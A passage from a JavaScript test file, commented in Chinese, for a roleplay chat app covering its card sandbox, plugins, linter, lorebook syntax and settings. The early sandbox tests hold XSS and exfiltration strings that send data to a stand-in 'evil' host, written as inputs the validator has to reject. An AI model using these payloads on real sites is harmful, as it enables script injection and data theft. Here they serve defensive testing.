  assert.ok(!evilBg.srcdoc.includes('javascript:alert'), '不是素材库地址的背景不许进样式');
  assert.match(rendered.srcdoc, /Content-Security-Policy/);
  assert.match(rendered.srcdoc, /connect-src 'none'/);
  assert.equal(rendered.sandbox, 'allow-scripts');
  assert.ok(!rendered.sandbox.includes('allow-same-origin'));
  assert.equal(rendered.capabilities[0], 'chat.vars.read');
  assert.match(rendered.srcdoc, /var allowed = \["chat.vars.read"\]/);
  const limited = renderCardFrontend({ js: '', capabilities: [] });
  assert.match(limited.srcdoc, /var allowed = \[\]/, '没声明的能力不在桥的白名单里');
  assert.equal(SANDBOX_POLICY.bridge.methods['chat.send'], 'chat.send');
});

test('卡内前端沙箱：脚本块逃逸 / 导航 / meta refresh 也要拦', () => {
  const rulesOf = (input) => validateCardFrontend({ capabilities: [], ...input }).issues.map((issue) => issue.rule);
  // JS 直接拼进 <script>，出现结束标签就能提前收尾、把后面的内容当 HTML 插出去
  assert.ok(rulesOf({ js: '</scr' + 'ipt><scr' + 'ipt>alert(1)</scr' + 'ipt>' }).includes('js.scriptBreak'));
  assert.ok(rulesOf({ css: '</sty' + 'le><img src=x>' }).includes('css.styleBreak'));
  // 导航不受 connect-src 管，是绕过"禁止联网"把数据带出去的通道
  assert.ok(rulesOf({ js: "location.href = 'https://evil/?' + btoa(secret)" }).includes('js.navigation'));
  assert.ok(rulesOf({ js: "location.assign('https://evil')" }).includes('js.navigation'));
  assert.ok(rulesOf({ js: "window.open('https://evil')" }).includes('js.navigation'));
  assert.ok(rulesOf({ js: "window['location'].href = 'https://evil'" }).includes('js.locationAccess'));
  assert.ok(rulesOf({ html: "<meta http-equiv='refresh' content='0;url=https://evil'>" }).includes('html.metaRefresh'));
  // 只是比较、读一下当前地址，不该误伤
  assert.deepEqual(rulesOf({ js: 'if (a == location.href) { b(); }' }), []);
  assert.equal(validateCardFrontend({ js: 'Tavern.ready();', capabilities: [] }).ok, true);
});

test('卡内前端沙箱：HTML 里的脚本和内联事件也要拦，注入前要转义', () => {
  // HTML 里写 <script> 能整段绕过 js.* 规则（静态扫描只扫 js 字段）—— 必须直接禁掉
  const inHtml = validateCardFrontend({ html: '<scr' + 'ipt>fetch("https://evil")</scr' + 'ipt>', capabilities: [] });
  assert.equal(inHtml.ok, false);
  assert.ok(inHtml.issues.some((issue) => issue.rule === 'html.scriptTag'));
  // 外链脚本同样被 html.scriptTag 覆盖
  assert.equal(validateCardFrontend({ html: '<scr' + 'ipt src="https://cdn/x.js"></scr' + 'ipt>', capabilities: [] }).ok, false);
  // 内联事件处理器是 error（以前只是提示）
  const inline = validateCardFrontend({ html: '<img src=x onerror="location=\'https://evil\'">', capabilities: [] });
  assert.equal(inline.ok, false);
  assert.ok(inline.issues.some((issue) => issue.rule === 'html.inlineHandler' && issue.severity === 'error'));

  // raw text 转义：`</script` 变成 `<\/script`，解析器不会提前收尾（不依赖 lint 是否开启）
  assert.equal(escapeRawText("const s = '</scr" + "ipt>';", 'script'), "const s = '<\\/scr" + "ipt>';");
  assert.equal(escapeRawText('a{content:"</sty' + 'le>"}', 'style'), 'a{content:"<\\/sty' + 'le>"}');
  assert.equal(escapeRawText("const a = 1 < 2;", 'script'), 'const a = 1 < 2;', '正常代码原样保留');
  const rendered = renderCardFrontend({ js: "const a = 1 < 2;\nTavern.ready();", capabilities: [] });
  assert.ok(rendered.srcdoc.includes('const a = 1 < 2;'), '渲染出来的 srcdoc 里代码没被改坏');
});

test('卡内界面：自己的卡自动跑，别人的卡要信任，信任绑在代码指纹上', () => {
  const code = { html: '<b>x</b>', css: '', js: 'Tavern.ready();', capabilities: ['chat.vars.read'] };
  const hash = frontendCodeHash(code);

  // 自己新建的卡（source = original）：跳过静态检查、自动跑
  const own = resolveFrontendPolicy({ source: 'original', codeHash: hash, trust: null });
  assert.equal(own.tier, 'own');
  assert.equal(own.trusted, true);
  assert.equal(own.autoRun, true);
  assert.equal(own.skipLint, true);

  // 导入的卡：默认最严，等你点一下
  const strict = resolveFrontendPolicy({ source: 'imported', codeHash: hash, trust: null });
  assert.equal(strict.tier, 'strict');
  assert.equal(strict.trusted, false);
  assert.equal(strict.autoRun, false);
  assert.equal(strict.skipLint, false);

  // 你点过"信任这张卡"之后：静态检查放过，但仍然要你点（autoRun 只给自己的卡）
  const trusted = resolveFrontendPolicy({ source: 'imported', codeHash: hash, trust: { codeHash: hash } });
  assert.equal(trusted.trusted, true);
  assert.equal(trusted.trustedByUser, true);
  assert.equal(trusted.skipLint, true);
  assert.equal(trusted.autoRun, false);

  // 代码改一个字 → 指纹对不上 → 信任自动失效
  const changed = resolveFrontendPolicy({
    source: 'imported',
    codeHash: frontendCodeHash({ ...code, js: 'Tavern.ready(); ' }),
    trust: { codeHash: hash },
  });
  assert.equal(changed.trusted, false);
  assert.equal(changed.skipLint, false);

  // 跳过静态检查 ≠ 关掉沙箱：CSP 一条都不少
  assert.throws(() => renderCardFrontend({ js: "fetch('https://evil')" }), ValidationError);
  const relaxed = renderCardFrontend({ js: "fetch('https://evil')" }, { policy: trusted });
  assert.match(relaxed.srcdoc, /connect-src 'none'/);
  assert.equal(relaxed.sandbox, 'allow-scripts');
  assert.ok(Object.keys(relaxed.methods).length > 0, '宿主侧桥要知道方法 → 能力 的对应关系');
  assert.match(relaxed.srcdoc, /tavern-turn/, '宿主推的回合事件要转成卡里能监听的 tavern-turn');

  // 代码存在卡数据里：跟着导出走，换行不能被压掉
  const extras = normaliseExtras({ frontend: { html: 'a\nb', js: 'x\ny', capabilities: ['chat.vars.read', 'chat.vars.read', 'no.such'] } });
  assert.equal(extras.frontend.html, 'a\nb');
  assert.equal(extras.frontend.js, 'x\ny');
  assert.deepEqual(extras.frontend.capabilities, ['chat.vars.read', 'no.such']);
  assert.equal(hasFrontend(extras.frontend), true);
  assert.equal(hasFrontend(normaliseExtras({}).frontend), false, '没写代码 = 这张卡没有界面');
});

test('卡内界面：能力声明也算进代码指纹（只补一句声明，信任必须失效）', () => {
  const base = { html: '<b>x</b>', css: '.a{}', js: 'Tavern.ready();' };
  const readOnly = frontendCodeHash({ ...base, capabilities: ['chat.vars.read'] });

  // 代码一字不动，只多声明一个能力 → 指纹必须变
  assert.notEqual(frontendCodeHash({ ...base, capabilities: ['chat.vars.read', 'chat.send'] }), readOnly);
  // 声明全去掉，也是"变了"
  assert.notEqual(frontendCodeHash({ ...base, capabilities: [] }), readOnly);

  // 只是顺序不同 / 重复勾同一个，不算变更，否则每次编辑都要重新信任
  assert.equal(
    frontendCodeHash({ ...base, capabilities: ['chat.send', 'chat.vars.read'] }),
    frontendCodeHash({ ...base, capabilities: ['chat.vars.read', 'chat.send'] }),
  );
  assert.equal(frontendCodeHash({ ...base, capabilities: ['chat.vars.read', 'chat.vars.read'] }), readOnly);

  // 真实场景：这张卡原本只声明了「读」，你信任过；后来它补上 chat.send
  const escalated = resolveFrontendPolicy({
    source: 'imported',
    codeHash: frontendCodeHash({ ...base, capabilities: ['chat.vars.read', 'chat.send'] }),
    trust: { codeHash: readOnly },
  });
  assert.equal(escalated.trusted, false, '只补了一句能力声明，也要退回未信任');
  assert.equal(escalated.skipLint, false);
  assert.equal(escalated.allowExternalAssets, false);

  // 模块（Mod）那边同一套规矩
  const mod = { html: '<i>x</i>', css: '.b{}', js: 'Tavern.ready();' };
  const modRead = moduleCodeHash({ ...mod, capabilities: ['chat.vars.read'] });
  assert.notEqual(moduleCodeHash({ ...mod, capabilities: ['chat.vars.read', 'chat.send'] }), modRead);
  assert.equal(moduleCodeHash({ ...mod, capabilities: ['chat.vars.read'] }), modRead, '同样的代码和能力，指纹要稳定');
});

test('插件：manifest 校验与四种钩子', async () => {
  const manifest = normaliseManifest(
    { name: 'hello', title: 'Hello', views: [{ key: 'hello-plugin', file: 'view.mjs' }], modules: [{ id: 'hello-plugin' }] },
    'hello',
  );
  assert.equal(manifest.name, 'hello');
  assert.equal(manifest.main, 'index.mjs');
  assert.equal(manifest.views[0].key, 'hello-plugin');
  assert.equal(manifest.modules[0].web.view, 'hello-plugin', '模块同名视图要自动挂上');
  assert.equal(normaliseManifest({}, 'folder-name').name, 'folder-name', '没写 name 就用文件夹名');
  assert.throws(() => normaliseManifest({ name: 'bad name' }), ValidationError);
  assert.throws(() => normaliseManifest({ name: 'ok', views: [{ key: 'x' }] }), ValidationError);
  assert.throws(() => normaliseManifest({ name: 'ok', main: '../escape.mjs' }), ValidationError);
  assert.throws(() => normaliseManifest({ name: 'ok', styles: ['../x.css'] }), ValidationError);

  const host = createPluginHost({ manifest, logger: silentLogger });
  host.api.routes.get('/api/hello', () => {});
  host.api.skills.register({ id: 'hello.greet', handler: () => {} });
  host.api.tools.register({ name: 'hello.ping', handler: () => {} });
  host.api.views.register({ key: 'hello-extra' });
  assert.equal(host.routes.length, 1);
  assert.deepEqual(host.summary(), { routes: 1, skills: 1, tools: 1, views: 2 });
  assert.deepEqual(PLUGIN_HOOKS, ['routes', 'skills', 'tools', 'views']);
  // 钩子用错了要当场报错（插件作者的错，别等到运行时）
  assert.throws(() => host.api.routes.get('/hello', () => {}), ValidationError);
  assert.throws(() => host.api.routes.get('/api/x'), ValidationError);
  assert.throws(() => host.api.skills.register({ id: 'x' }), ValidationError);
  assert.throws(() => host.api.tools.register({ name: 'x' }), ValidationError);
  assert.throws(() => host.api.views.register({}), ValidationError);

  // 插件注册的 MCP 工具：能列出来、能调用，返回形状不标准也会被包成 MCP 结果
  const server = createTavernMcpServer({
    services: {},
    extraTools: [
      { name: 'hello.ping', handler: () => ({ content: [{ type: 'text', text: 'pong' }] }) },
      { name: 'hello.wrap', handler: () => ({ ok: true }) },
      { name: 'cards.list', handler: () => ({ content: [{ type: 'text', text: '不该覆盖内置的' }] }) },
      { handler: () => {} },
    ],
  });
  assert.ok(server.listTools().some((tool) => tool.name === 'hello.ping'));
  assert.ok(server.listTools().some((tool) => tool.name === 'hello.wrap'));
  assert.equal(server.listTools().filter((tool) => tool.name === 'cards.list').length, 1, '同名不覆盖内置工具');
  assert.equal((await server.callTool('hello.ping', {})).content[0].text, 'pong');
  assert.match((await server.callTool('hello.wrap', {})).content[0].text, /"ok": true/);
});

test('前端：快捷键组合解析、匹配与"处理器放行"', () => {
  assert.deepEqual(parseCombo('Ctrl+Enter'), { ctrl: true, alt: false, shift: false, meta: false, key: 'Enter' });
  assert.deepEqual(parseCombo('Cmd+K'), { ctrl: false, alt: false, shift: false, meta: true, key: 'K' });
  assert.deepEqual(parseCombo('Alt+Shift+R'), { ctrl: false, alt: true, shift: true, meta: false, key: 'R' });
  assert.equal(parseCombo('+'), null);
  assert.equal(parseCombo(''), null);
  assert.equal(parseCombo(null), null);

  const ev = (key, mods = {}) => ({ key, ctrlKey: false, altKey: false, shiftKey: false, metaKey: false, ...mods });
  assert.ok(matchesCombo(ev('Enter'), 'Enter'));
  assert.ok(!matchesCombo(ev('Enter', { shiftKey: true }), 'Enter'), 'Shift+Enter 不该触发"发送"');
  assert.ok(matchesCombo(ev('Enter', { ctrlKey: true }), 'Ctrl+Enter'));
  assert.ok(!matchesCombo(ev('Enter', { ctrlKey: true }), 'Enter'));
  assert.ok(matchesCombo(ev('r', { altKey: true }), 'Alt+R'), '字母大小写不敏感');
  assert.ok(matchesCombo(ev('Escape'), 'Esc'));
  assert.ok(matchesCombo(ev(' '), 'Space'));

  const mgr = createShortcutManager();
  let fired = 0;
  mgr.register('send', 'Enter', () => { fired += 1; });
  mgr.register('continue', 'Ctrl+Enter', () => { fired += 10; });
  assert.equal(mgr.handle(ev('Enter')), true);
  assert.equal(mgr.handle(ev('Enter', { ctrlKey: true })), true);
  assert.equal(fired, 11);
  assert.equal(mgr.handle(ev('F5')), false);
  // 处理器返回 false 表示"这次不处理"，继续往后找
  mgr.register('a', 'Alt+A', () => false);
  let second = false;
  mgr.register('b', 'Alt+A', () => { second = true; });
  assert.equal(mgr.handle(ev('a', { altKey: true })), true);
  assert.ok(second, '前一个处理器放行后要继续匹配');
  // 留空 = 解绑
  mgr.register('send', '', () => { fired += 100; });
  assert.equal(mgr.handle(ev('Enter')), false);
});

test('前端布局：外壳 Grid 的行高被钉死，长内容才有滚动条（防回归）', () => {
  const css = readFileSync(new URL('../web/styles/base.css', import.meta.url), 'utf8');
  // .shell 是"侧栏 + 主区"的两列 Grid，容器有固定高度。行高若留默认的 auto，
  // 内容一高整行就被顶高，.main 的 height:100% 等于内容高度，.view-host 的
  // overflow-y:auto 永远不触发 —— 写卡区那些长表单就变成"没有滚动条、滚不动"。
  const start = css.indexOf('.shell {');
  assert.ok(start >= 0, 'base.css 里应该有 .shell 规则');
  const shellRule = css.slice(start, css.indexOf('}', start));
  assert.match(shellRule, /grid-template-rows:\s*minmax\(0,\s*1fr\)/);
  assert.match(css, /\.view-host\s*\{[^}]*overflow-y:\s*auto/);
});

test('前端：多语言字典与命令面板过滤', () => {
  setLocale('zh-CN');
  assert.equal(t('btn.send'), '发送');
  assert.equal(moduleTitle({ id: 'chat', title: '对话' }), '对话');
  setLocale('en');
  assert.equal(t('btn.send'), 'Send');
  assert.equal(moduleTitle({ id: 'chat', title: '对话' }), 'Chat');
  assert.equal(moduleTitle({ id: 'unknown-mod', title: '中文名' }), '中文名', '字典里没有就回退服务端标题');
  assert.equal(t('nope.key'), 'nope.key', '漏翻只显示 key，不崩');
  assert.equal(t('app.footer', { modules: 3, areas: 2 }), '3 modules · 2 areas');
  assert.equal(t('setting.ui.theme.label', null, '备用'), 'Theme');
  setLocale('zh-CN');

  const items = [
    { id: 'a', title: '对话', subtitle: '玩卡区', keywords: 'chat 对话' },
    { id: 'b', title: '花费与统计', subtitle: '工具箱', keywords: 'cost 花费' },
  ];
  assert.equal(filterCommands(items, '').length, 2);
  assert.equal(filterCommands(items, 'chat')[0].id, 'a');
  assert.equal(filterCommands(items, '花费')[0].id, 'b');
  assert.equal(filterCommands(items, 'zzz').length, 0);
  assert.equal(nextTheme('system'), 'light');
  assert.equal(nextTheme('dark'), 'sepia');
  assert.equal(nextTheme('sepia'), 'system');
});

test('卡内前端桥：charVars.set 要按角色变量 scope 写入（防回归）', async () => {
  const saved = { document: globalThis.document, window: globalThis.window, Node: globalThis.Node, fetch: globalThis.fetch };

  class FakeNode {}
  class FakeEl extends FakeNode {
    constructor(tag) {
      super();
      this.tagName = String(tag).toUpperCase();
      this.children = [];
      this.attributes = new Map();
      this.style = {};
      this.dataset = {};
      this.className = '';
      if (String(tag).toLowerCase() === 'iframe') {
        this._posted = [];
        this.contentWindow = { postMessage: (msg) => this._posted.push(msg) };
      }
    }
    append(...nodes) {
      for (const node of nodes.flat(Infinity)) {
        if (node === null || node === undefined || node === false) continue;
        this.children.push(node);
      }
      return this;
    }
    appendChild(node) { this.children.push(node); return node; }
    replaceChildren(...nodes) { this.children = []; return this.append(...nodes); }
    removeChild(node) { const i = this.children.indexOf(node); if (i >= 0) this.children.splice(i, 1); return node; }
    setAttribute(key, value) { this.attributes.set(key, value); }
    getAttribute(key) { return this.attributes.get(key); }
    addEventListener() {}
    removeEventListener() {}
  }

  const listeners = [];
  globalThis.Node = FakeNode;
  globalThis.document = {
    createElement: (tag) => new FakeEl(tag),
    createTextNode: (text) => { const node = new FakeEl('#text'); node.textContent = text; return node; },
    createDocumentFragment: () => new FakeEl('#fragment'),
    addEventListener() {},
  };
  globalThis.window = { addEventListener: (type, fn) => { if (type === 'message') listeners.push(fn); } };

  const puts = [];
  const jsonResponse = (payload) => ({ ok: true, status: 200, headers: { get: () => 'application/json' }, json: async () => payload });
  globalThis.fetch = async (path, init = {}) => {
    if (init.method === 'PUT' && path.startsWith('/api/state/')) {
      puts.push({ path, body: JSON.parse(init.body) });
      return jsonResponse({ variables: [] });
    }
    if (path.startsWith('/api/chats/')) return jsonResponse({ id: 'chat1', characterId: 'card1' });
    return jsonResponse({});
  };

  try {
    const { createCardSandbox } = await import('../web/ui/card-sandbox.mjs');
    const sandbox = createCardSandbox({ getChatId: () => 'chat1' });
    sandbox.mount({
      srcdoc: '<html></html>',
      sandbox: 'allow-scripts',
      referrerPolicy: 'no-referrer',
      capabilities: ['char.vars.write'],
      methods: { 'charVars.set': 'char.vars.write' },
    });
    const frame = sandbox.el.children[0];
    assert.ok(frame?.contentWindow, '沙箱 iframe 要装到宿主里');
    assert.ok(listeners.length, '桥要挂上 message 监听');
    for (const fn of listeners) {
      fn({ source: frame.contentWindow, data: { source: 'tavern-card', id: 'c1', method: 'charVars.set', payload: { key: '好感度', value: 7 } } });
    }
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.equal(puts.length, 1, '桥应该回写一次状态');
    const [op] = puts[0].body.variables;
    assert.equal(op.scope, 'character', '角色变量要带 scope=character（写成 n 会被当对话变量落库，charVars.get 再也读不回来）');
    assert.equal(op.characterId, 'card1');
    assert.equal(op.key, '好感度');
    assert.equal(op.value, 7);
    assert.ok(frame._posted.some((msg) => msg.result === true), '桥要回一条成功');

    // ui.resize：卡片报自然高度 → 宿主撑开 iframe（不需要声明能力）
    for (const fn of listeners) {
      fn({ source: frame.contentWindow, data: { source: 'tavern-card', method: 'ui.resize', payload: { height: 500 } } });
    }
    assert.equal(frame.style.height, '500px', 'ui.resize 要把 iframe 撑到卡片报的高度');
  } finally {
    globalThis.document = saved.document;
    globalThis.window = saved.window;
    globalThis.Node = saved.Node;
    globalThis.fetch = saved.fetch;
  }
});

test('写卡质检：七病灶配额、开场白九项、八维评分、四元组与作者的话', async () => {
  // 干净的卡：不该误报
  const clean = {
    name: '沈知夏',
    description: '大二跨栏的时候摔过一次，锁骨下面留了道浅疤。嘴毒，但说的都是实话，所以更气人。',
    first_mes: '【时间】傍晚　【地点】体育馆\n器材室的门被推开，她正蹲着缠护踝。\n「还站着干嘛？八点锁门，要走顺便帮我把灯关了。」\n<details><summary>状态</summary>心情：待载入</details>\n你还没想好怎么开口。',
    tags: ['限左', '洁', '都市', '难攻略'],
    character_book: { entries: new Array(8).fill({ keys: ['x'], content: 'y' }) },
  };
  const report = lintCard(clean);
  assert.ok(report.total > 0 && report.total <= 100, '总分落在 0–100');
  assert.equal(report.scaled, true, '没有图片提示词时按其余维度折算');
  assert.ok(['publish', 'usable', 'revise'].includes(report.grade));
  assert.equal(report.dimensions.length, 8, '八维');

  // 七病灶：超配额要命中
  // 配额制的意思是"留一处当梗位可以，第二处就穿帮"，所以样本要有两处
  const flavored = scanAiFlavor(
    '她说那是「学费」。他又说那是「账」。不带脏字，全是事实句。不是懒，而是怕。' +
      '这瓶牛奶是她的胜利锚点。静养第 9 天。停顿了半秒。快了半拍。大一跑出 10秒98。',
  );
  const ids = flavored.hits.map((hit) => hit.id);
  assert.ok(ids.includes('quote-capping'), '引语点题要命中');
  assert.ok(ids.includes('antithesis-flip'), '对仗翻转要命中');
  assert.ok(ids.includes('invented-concept'), '生造概念词要命中');
  assert.ok(ids.includes('fake-precision'), '伪精确数字 / 半X 要命中');
  assert.ok(flavored.total >= 4);

  // 引号里的台词不受句式纪律约束
  const quoted = scanAiFlavor('「她说那是『学费』，不带脏字全是事实句。」');
  assert.equal(quoted.hits.length, 0, '台词（引号内）不该被判为病灶');

  // 开场白九项：缺项要如实报
  const opening = checkOpening('你好，我是新来的。', '');
  assert.equal(opening.total, 9);
  assert.ok(opening.passed < 9);
  const missing = opening.items.filter((item) => !item.ok).map((item) => item.id);
  assert.ok(missing.includes('status-bar'));
  assert.ok(missing.includes('details-panel'));

  // 四元组：性向是硬性要求
  assert.equal(checkFourTuple(['都市', '难攻略']).ok, false);
  assert.deepEqual(checkFourTuple(['都市', '难攻略']).missing, ['性向', '洁度']);
  assert.equal(checkFourTuple(['限左', '洁', '难攻略']).ok, true);

  // 作者的话：产品词要单独点出来
  const notes = checkCreatorNotes('对标某卡，差异化玩法核心。限左/洁/禁撅。AI 生成。');
  assert.equal(notes.clean, false);
  assert.ok(notes.productWords.includes('对标'));

  // 活人感九写法
  const alive = checkAlive('她顿了一下，嘴上说没事，心里却在想别的。');
  assert.ok(alive.passed >= 2);

  // 字段缺失要有 error 级别的问题
  const empty = lintCard({ name: '空卡' });
  assert.ok(empty.issues.some((issue) => issue.level === 'warn' && issue.field === 'description'));
  assert.equal(empty.total < 75, true, '空卡不该及格');
});

test('建卡向导：四元组选型、标签、骨架与选项校验', () => {
  const plan = planCard({ orientation: '限左', genre: '校园', purity: '洁', hooks: ['难攻略', '反差'] });
  assert.deepEqual(plan.tags, ['限左', '校园', '洁', '难攻略', '反差']);
  assert.ok(plan.positioning.includes('不要写进作者的话'));

  const draft = buildCardDraft({ name: '沈知夏', orientation: '限左', genre: '校园', purity: '洁', hooks: ['难攻略'], paradigm: 'dual-view' });
  assert.equal(draft.name, '沈知夏');
  assert.ok(draft.fields.system_prompt.includes('输出节奏四律'));
  assert.ok(draft.fields.system_prompt.includes('挤牙膏'));
  assert.ok(draft.fields.creator_notes.includes('括号大法'));
  assert.ok(draft.fields.description.includes('【沈知夏设定】'));
  assert.equal(OPENING_PARADIGMS.length, 5, '五种开场白范式');
  assert.ok((draft.tags ?? []).length >= 4);

  assert.throws(() => planCard({ orientation: '不存在的性向' }), /不认识/);
  assert.throws(() => planCard({ hooks: ['难攻略', '救赎', '酸涩', '反差'] }), /最多/);
  assert.throws(() => buildCardDraft({ name: '' }), /名字/);
  assert.throws(() => buildCardDraft({ name: 'x', paradigm: '不存在' }), /范式/);
  // 不传也能按默认补齐（不追问）
  assert.equal(planCard({}).tags[0], '全性向');
  assert.ok(CREATOR_NOTES_TEMPLATE.includes('括号大法'));
});

test('世界书一行语法：解析、往返、生成动作过滤、递归地图与条目体检', () => {
  const line = '### 老板娘 | keys: 酒馆, 打烊 | secondary: 深夜 | logic: and_all | order: 250 | depth: 3 | prob: 25 | sticky: 2 | cooldown: 6 | group: 掌柜 | weight: 150 | trigger: continue, swipe';
  const { entry, errors } = parseNotationLine(line);
  assert.deepEqual(errors, []);
  assert.equal(entry.comment, '老板娘');
  assert.deepEqual(entry.keys, ['酒馆', '打烊']);
  assert.deepEqual(entry.secondaryKeys, ['深夜']);
  assert.equal(entry.selectiveLogic, 3, 'and_all');
  assert.equal(entry.order, 250);
  assert.equal(entry.position, 4, 'depth 会把位置改成 atDepth');
  assert.equal(entry.probability, 25);
  assert.equal(entry.useProbability, true);
  assert.equal(entry.sticky, 2);
  assert.equal(entry.groupWeight, 150);
  assert.deepEqual(entry.injectionTrigger, ['continue', 'swipe']);

  // 缺省 keys = 常开（防死条目）
  const constant = parseNotationLine('### 世界总纲 | order: 100').entry;
  assert.equal(constant.constant, true, '没写 keys 要自动常开');
  const explicit = parseNotationLine('### 人物 | keys: 沈知夏').entry;
  assert.equal(explicit.constant, false);

  // 写回再解析，关键字段不丢
  const roundTrip = parseNotationLine(toNotation(entry)).entry;
  assert.deepEqual(roundTrip.keys, entry.keys);
  assert.equal(roundTrip.order, entry.order);
  assert.deepEqual(roundTrip.injectionTrigger, entry.injectionTrigger);

  // 生成动作过滤
  const list = [entry, explicit];
  assert.equal(filterByGeneration(list, 'normal').length, 1, '声明了 continue/swipe 的条目在 normal 下不生效');
  assert.equal(filterByGeneration(list, 'continue').length, 2);

  // 整块解析：正文归属到上一条
  const block = parseNotationBlock('### 甲 | keys: a\n正文甲\n\n### 乙 | keys: b\n正文乙');
  assert.equal(block.entries.length, 2);
  assert.equal(block.entries[0].content, '正文甲');
  assert.equal(block.entries[1].content, '正文乙');
  assert.ok(toNotationBlock(block.entries).includes('正文甲'));
  const bad = parseNotationBlock('没有条目头就先写了正文');
  assert.ok(bad.errors.length >= 1);

  // 递归地图：甲的正文里有「乙」，就该有一条边
  const map = buildRecursionMap([
    { uid: 'a', comment: '甲', keys: ['甲'], content: '这里提到了乙这个人。' },
    { uid: 'b', comment: '乙', keys: ['乙'], content: '无关。' },
  ]);
  assert.equal(map.edges.length, 1);
  assert.equal(map.edges[0].from, 'a');
  assert.equal(map.edges[0].to, 'b');

  // 环检测
  const cyc = buildRecursionMap([
    { uid: 'a', comment: '甲', keys: ['甲'], content: '乙' },
    { uid: 'b', comment: '乙', keys: ['乙'], content: '甲' },
  ]);
  assert.ok(cyc.cycles.length >= 1, '互指要报环');

  // 条目体检：死条目 / 巨条目
  const lint = lintEntries([
    { comment: '死的', keys: [], constant: false, content: '有正文' },
    { comment: '巨的', keys: ['x'], content: 'x'.repeat(3000) },
    { comment: '短的', keys: ['yy'], content: '短' },
  ]);
  assert.ok(lint.issues.some((issue) => issue.level === 'error'), '永远不触发的要报错');
  assert.ok(lint.issues.some((issue) => issue.message.includes('2500')));
  assert.ok(lint.issues.some((issue) => issue.message.includes('secondary')));
});

test('模块化 Markdown 卡：解析、frontmatter、世界书与写回', () => {
  const md = [
    '---',
    'name: 沈知夏',
    'scenario: 傍晚的体育馆',
    'tags: [限左, 校园, 洁]',
    '# 创作定位：只放注释，别进作者的话',
    '---',
    '## Description',
    '大二跨栏摔过一次。',
    '## First Message',
    '「还站着干嘛？」',
    '## Alternate Greeting 1',
    '三天后的走廊。',
    '## Lorebook',
    '### 教练 | keys: 教练, 老陈 | order: 210',
    '他管得比谁都严。',
    '## Creator\'s Notes',
    '限左/洁/禁撅。',
  ].join('\n');
  const parsed = cardFromMarkdown(md);
  assert.equal(parsed.card.name, '沈知夏');
  assert.deepEqual(parsed.card.tags, ['限左', '校园', '洁']);
  assert.ok(parsed.card.description.includes('跨栏'));
  assert.equal(parsed.card.alternate_greetings.length, 1);
  assert.equal(parsed.lorebook.length, 1);
  assert.equal(parsed.card.character_book.entries.length, 1);
  assert.ok(parsed.comments.some((line) => line.includes('创作定位')));
  assert.equal(parsed.unknowns.length, 0);

  const sections = splitSections('## A\n1\n## B\n2');
  assert.deepEqual(sections.map((section) => section.title), ['A', 'B']);

  // 往返：导出再解析，关键内容还在
  const back = markdownFromCard(parsed.card);
  const again = cardFromMarkdown(back);
  assert.equal(again.card.name, '沈知夏');
  assert.ok(again.card.first_mes.includes('还站着干嘛'));
  assert.equal(again.lorebook.length, 1);
  assert.throws(() => cardFromMarkdown(''), /空的/);
});

test('临场指令：三层作用域、覆盖顺序与插入频率', () => {
  const layers = {
    defaultNote: { prompt: '默认层', position: 'before' },
    characterNote: { prompt: '角色层', position: 'after' },
    chatNote: { prompt: '对话层', position: 'atDepth', depth: 2, interval: 3 },
  };
  const resolved = resolveNote(layers);
  assert.equal(resolved.from, 'chat');
  assert.equal(resolved.note.prompt, '对话层');
  assert.equal(resolved.note.depth, 2);

  // 对话层关掉就落到角色层
  const off = resolveNote({ ...layers, chatNote: { prompt: '对话层', enabled: false } });
  assert.equal(off.from, 'character');
  assert.equal(off.note.prompt, '角色层');
  // 全关就没有
  assert.equal(resolveNote({}).note, null);

  // 频率：interval=3 → 第 1 轮插（开卡必须有），第 3、6 轮插，第 2 轮不插
  const note = normaliseNote({ prompt: 'x', interval: 3 });
  assert.equal(shouldInject(note, 1), true);
  assert.equal(shouldInject(note, 2), false);
  assert.equal(shouldInject(note, 3), true);
  assert.equal(shouldInject(normaliseNote({ prompt: 'x', interval: 1 }), 2), true);
  assert.equal(shouldInject(null, 1), false);

  assert.throws(() => normaliseNote({ prompt: 'x', position: '不存在的' }), /位置/);
  assert.throws(() => normaliseNote({ prompt: 'x', role: 'root' }), /角色/);
  assert.ok(describeNote(note, 'default').includes('每 3 条用户输入'));
  assert.equal(normaliseNote('  '), null);
});

test('采样参数：顺序规整、恢复默认、中性化与差异描述', () => {
  const profile = createSamplerProfile({ backend: 'llamacpp' });
  assert.deepEqual(profile.order.slice(0, 3), BACKEND_DEFAULT_ORDER.llamacpp.slice(0, 3));
  assert.equal(profile.disabled.length, 0);
  assert.equal(describeDiff(profile), '与默认一致');

  // 用户顺序被尊重，没提到的补到后面（新采样器不会因为老配置消失）
  const custom = createSamplerProfile({ backend: 'llamacpp', order: ['top_p', 'temperature', '不认识的'] });
  assert.deepEqual(custom.order.slice(0, 2), ['top_p', 'temperature']);
  assert.equal(custom.order.includes('不认识的'), false);
  assert.ok(custom.order.length >= SAMPLER_CATALOG.length);
  assert.ok(describeDiff(custom).includes('顺序改了'));

  const neutralised = neutralize(custom);
  assert.ok(neutralised.disabled.includes('temperature'));
  assert.ok(neutralised.disabled.includes('top_p'));
  assert.equal(neutralised.enabled.includes('banned_tokens'), true, '禁用词表属于约束类，不该被关');
  assert.ok(describeDiff(neutralised).includes('关掉了'));

  const reset = resetOrder(custom);
  assert.deepEqual(reset.order.slice(0, 3), BACKEND_DEFAULT_ORDER.llamacpp.slice(0, 3));
  assert.equal(describeDiff(reset), '与默认一致');

  assert.equal(normaliseOrder([], 'koboldcpp')[0], BACKEND_DEFAULT_ORDER.koboldcpp[0]);
  assert.throws(() => createSamplerProfile({ backend: '没有这个后端' }), /不认识的文本补全后端/);
  assert.throws(() => createSamplerProfile({ enabled: ['不存在的采样器'] }), /不认识的采样器/);
});

test('套装：打包与选择性应用', () => {
  const loadout = createLoadout(
    { characters: ['a', 'b'], persona: 'persona-1', preset: 'preset-1', variables: { 好感度: 3 } },
    { name: '校园纯爱' },
  );
  assert.equal(loadout.name, '校园纯爱');
  assert.equal(loadout.parts.length, LOADOUT_PARTS.length, '默认打包全部');
  assert.deepEqual(loadout.payload.characters, ['a', 'b']);

  // 只应用 persona：其它部分保持现状
  const applied = applyLoadout(loadout, { persona: '旧', preset: '我的预设', variables: { x: 1 } }, ['persona']);
  assert.equal(applied.next.persona, 'persona-1');
  assert.equal(applied.next.preset, '我的预设', '没勾的部分不该被覆盖');
  assert.deepEqual(applied.next.variables, { x: 1 });
  assert.deepEqual(applied.applied, ['persona']);

  // 整套应用
  const all = applyLoadout(loadout, {}, null);
  assert.equal(all.applied.length, loadout.parts.length);

